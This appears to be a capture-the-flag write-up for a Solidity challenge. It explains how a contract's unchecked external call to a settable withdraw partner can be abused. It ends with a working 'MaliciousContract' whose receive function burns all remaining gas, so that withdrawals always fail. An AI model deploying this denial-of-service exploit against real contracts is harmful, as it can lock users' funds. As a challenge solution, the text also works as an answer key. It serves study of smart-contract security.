# Requirements

- Your goal is to make a DoS attack, making imposible to withdraw funds.

# Attack explanation

To make a DoS attack, we need to create an external contract. We have spotted our setWithdrawPartner that will help us point the targe sc to our new sc.

```
function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }
```

We are going to exploit the external call vulnerability on withdraw function

```
function withdraw() public {
  uint amountToSend = address(this).balance / 100;
  partner.call{value:amountToSend}(""); --> HERE
  payable(owner).transfer(amountToSend);
  timeLastWithdrawn = block.timestamp;
  withdrawPartnerBalances[partner] +=  amountToSend;
}
```

We need to make that external call consume all the gasleft of the transaction, in order to revert without finishing the transaction in a gracefully way.

# Attack function

We could solve the challenge by just using the following attack proxy sc:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract MaliciousContract {
    address public attacker;

    constructor() {
        attacker = msg.sender;
    }

    // Receive function that consumes all gas.
    receive() external payable {
        while (gasleft() > 0) {}
    }
}

```
